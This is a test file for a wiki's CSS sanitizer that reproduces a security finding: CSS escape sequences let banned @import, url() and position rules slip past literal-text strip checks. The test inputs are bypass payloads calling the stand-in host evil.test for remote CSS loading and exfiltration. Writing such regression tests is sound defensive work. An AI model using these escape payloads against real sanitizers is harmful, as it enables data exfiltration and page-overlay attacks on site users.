import { describe, expect, it } from "vitest";
import { scopeArticleCss } from "@/lib/wiki/cssScope";

// QA security finding (#105, Heavy lane) — CSS-escape bypass of the X4 CSS-block strip.
//
// `scopeArticleCss` strips dangerous at-rules / properties / value tokens by matching the
// UN-DECODED literal text that css-tree puts on `node.name`, `node.property`, and the
// generated value string. But a conformant browser DECODES CSS escape sequences when it
// tokenizes — `@imp\ort` → `@import`, `po\73 ition` → `position`, `\75 rl(` → `url(`. So an
// attacker-controlled TemplateStyles `<style>` block can hide every banned construct behind
// an escape: the strip checks see a benign-looking literal, the browser sees the live token.
//
// The spike's `\75rl(` "fires no request — CSSOM-confirmed" claim was validated against
// jsdom, whose tokenizer does NOT decode these escapes the way real browsers do; that is
// why the existing jsdom-run suite never caught this. There is no CSP backstop in the repo
// (no Content-Security-Policy header in deploy/Caddyfile, next.config, or app code), so the
// sanitizer is the sole gate. This defeats AC4 (url exfiltration), AC5 (off-flow position),
// and AC6 (@import remote-CSS pull). AC7 (selector scope) is NOT affected — scoping prepends
// `.wiki-body ` unconditionally regardless of selector content.
//
// GROUND TRUTH (passing) — css-tree's own ident.decode IS the CSS Syntax tokenizer browsers
// use; it confirms the escaped forms decode to the live banned keywords.
describe("escape ground truth — css-tree decodes these to live banned keywords", () => {
  it("ident.decode maps the escaped forms to import / position / url", async () => {
    const ct: { ident?: { decode?: (s: string) => string } } = await import("css-tree");
    const decode = ct.ident?.decode;
    expect(typeof decode).toBe("function");
    expect(decode!("imp\\ort")).toBe("import");
    expect(decode!("\\69mport")).toBe("import");
    expect(decode!("po\\73 ition")).toBe("position");
    expect(decode!("\\75 rl")).toBe("url");
    expect(decode!("ur\\6c")).toBe("url");
    expect(decode!("\\000075rl")).toBe("url");
  });
});

// SECURITY TARGETS (it.fails — currently the bypass, MUST pass once Dev decodes identifiers
// /at-keywords/function names before the strip checks). When the fix lands, flip `it.fails`
// to `it`. Each currently FAILS, which is the precise reproduction of the defect.
describe("AC6 — escaped @import must be dropped (currently bypassed)", () => {
  it.fails("@imp\\ort with a remote prelude is dropped (escaped at-keyword)", async () => {
    const out = await scopeArticleCss('@imp\\ort "//evil.test/x.css";.a{color:red}');
    expect(out).not.toContain("evil.test");
  });
  it.fails("@\\69mport (hex-escaped 'i') is dropped", async () => {
    const out = await scopeArticleCss('@\\69mport "//evil.test/y.css";.a{color:red}');
    expect(out).not.toContain("evil.test");
  });
});

describe("AC4 — escaped url() must be dropped (currently bypassed)", () => {
  it.fails("\\75 rl( (hex-escaped 'u') exfil is dropped", async () => {
    const out = await scopeArticleCss(".x{background:\\75 rl(//evil.test/a)}");
    expect(out).not.toContain("evil.test");
  });
  it.fails("ur\\6c( (hex-escaped 'l') exfil is dropped", async () => {
    const out = await scopeArticleCss(".x{background:ur\\6c(//evil.test/a)}");
    expect(out).not.toContain("evil.test");
  });
});

describe("AC5 — escaped position/property must be dropped (currently bypassed)", () => {
  it.fails("po\\73 ition:fixed (escaped property name) is dropped", async () => {
    const out = await scopeArticleCss(".g{po\\73 ition:fixed;top:0}");
    // browser decodes the property to `position` and applies fixed positioning
    expect(out.replace(/\s+/g, "")).not.toMatch(/o\\?73\s*ition:fixed|position:fixed/i);
  });
  it.fails("position:f\\69xed (escaped value) is dropped", async () => {
    const out = await scopeArticleCss(".g{position:f\\69xed;top:0}");
    expect(out).not.toMatch(/position:\s*f/i);
  });
});

// AC7 control — selector scope confinement is robust to escapes (this PASSES today and
// must keep passing): an escaped `body` selector still receives the `.wiki-body ` prefix.
describe("AC7 — selector scoping is robust to escapes (control, passes)", () => {
  it("an escaped bare selector is still confined under .wiki-body", async () => {
    const out = await scopeArticleCss("\\62 ody{margin:0}"); // escaped `body`
    expect(out.startsWith(".wiki-body")).toBe(true);
  });
});
